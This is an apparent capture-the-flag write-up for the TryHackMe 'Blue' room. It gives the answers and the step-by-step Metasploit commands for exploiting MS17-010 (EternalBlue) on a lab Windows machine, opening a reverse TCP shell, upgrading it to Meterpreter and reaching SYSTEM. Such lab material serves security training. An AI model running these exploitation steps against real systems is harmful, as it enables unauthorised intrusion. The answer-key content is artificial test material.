# Blue

Room: [Blue](https://tryhackme.com/room/blue)

Rrerequisite Rooms:
1. [Nmap](https://tryhackme.com/room/furthernmap)
2. [Metasploit](https://tryhackme.com/module/metasploit)

<img width="932" height="189" alt="image" src="https://github.com/user-attachments/assets/e935a766-a301-4bec-ac14-56a4ff8c48b3" />

## Recon

Start the Lab Machine and if using your Kali Machine, connect to the TryHackMe server by `sudo openvpn <FILENAME>`

### Answer the questions below

1. Scan the machine.

write `nmap <TARGET_IP>` to scan the target system.

<img width="331" height="170" alt="image" src="https://github.com/user-attachments/assets/0e777977-f231-4a12-ba35-fa03bef896d8" />

2. How many ports are open with a port number under 1000?

3 (ports 135, 139 and 445)

4. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

ms17-010

Specifically for the EternalBlue room, you can check the smb vulnerability by: `nmap --script smb-vuln* -p445 <TARGET_IP>`

<img width="521" height="276" alt="image" src="https://github.com/user-attachments/assets/908f5d81-00c1-442e-bcef-b416f061ba94" />

This vulnerability corresponds to [CVE-2017-0143](https://nvd.nist.gov/vuln/detail/cve-2017-0143), commonly known as EternalBlue, a critical flaw in the SMBv1 (Server Message Block version 1) protocol that allows remote attackers to execute arbitrary code on affected Windows systems without authentication.

## Gain Access

### Answer the questions below

1. Start Metasploit.

Write command: `msfconsole`

<img width="350" height="335" alt="image" src="https://github.com/user-attachments/assets/679c2023-218f-4c8b-9ed7-e65a508fddcd" />

2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

Write command: `search ms17-010` to find the path of the exploit. The first option 0 is the answer: `exploit/windows/smb/ms17_010_eternalblue`

<img width="848" height="248" alt="image" src="https://github.com/user-attachments/assets/df858c6e-6009-43c6-b635-6f71d57f936a" />

Write command `use 0` to select the desired path.

<img width="598" height="78" alt="image" src="https://github.com/user-attachments/assets/a7f4a546-43aa-47b1-b1b3-110f0d31cf94" />

3. Show options and set the one required value. What is the name of this value? (All caps for submission)

Check the parameters by command: `show options`. RHOSTS is the answer of this question.

<img width="1300" height="529" alt="image" src="https://github.com/user-attachments/assets/f8a32932-7349-4250-b95c-5d027d236a1d" />

Set the `RHOSTS` parameter by: `set RHOSTS <TARGET_IP>`

Set the `LHOST` paremeter by: `set LHOST <YOUR_TUN0_IP>`. You can see your TryHackMe IP by `ipconfig`

<img width="1044" height="607" alt="image" src="https://github.com/user-attachments/assets/a982b077-4f42-4d06-bf41-1a2e9c691998" />

4. Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter: `set payload windows/x64/shell/reverse_tcp`. With that done, run the exploit!

<img width="455" height="40" alt="image" src="https://github.com/user-attachments/assets/b5e8ac91-ee59-4938-ac41-880d8a3f1929" />

Then write command: `exploit` to run the exploit:

<img width="1104" height="499" alt="image" src="https://github.com/user-attachments/assets/ad9b3792-0d9b-49b1-a02a-cb29ee2e663c" />

5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

To background the shell do `Ctrl + Z`:

<img width="274" height="40" alt="image" src="https://github.com/user-attachments/assets/5e87b5d7-239a-440c-9279-e4cc8e7713e7" />

## Escalate

### Answer the questions below

1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

`post/multi/manage/shell_to_meterpreter`

You can check here: [Upgrading Shells to Meterpreter](https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html)

2. Select this (use MODULE_PATH). Show options, what option are we required to change?

`SESSION`

Write `use post/multi/manage/shell_to_meterpreter`:

<img width="463" height="53" alt="image" src="https://github.com/user-attachments/assets/d8293628-0e16-4222-9db1-d2b1987dd93a" />

Then: `show options`:

<img width="645" height="158" alt="image" src="https://github.com/user-attachments/assets/00e49502-7698-4c9f-8081-46440d4546ff" />

3. Set the required option, you may need to list all of the sessions to find your target here.

Write `set SESSION 1` (There is only 1 session as I used `exploit` and it automatically uses the first session):

<img width="306" height="36" alt="image" src="https://github.com/user-attachments/assets/a921f875-f257-4415-bebb-12ddbff9bd90" />

4. Run! If this doesn't work, try completing the exploit from the previous task once more.

Write command: `run` and then do `Ctrl + C` to check the sessions by: `sessions -l`

<img width="1555" height="439" alt="image" src="https://github.com/user-attachments/assets/db8fcde3-eb7d-4de3-b693-b7ed84a59a0a" />

7. Once the meterpreter shell conversion completes, select that session for use.

Write: `sessions -i 2`

<img width="316" height="50" alt="image" src="https://github.com/user-attachments/assets/1c628953-3eb2-4cf4-a50e-101f0d1c362a" />

8. Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.






















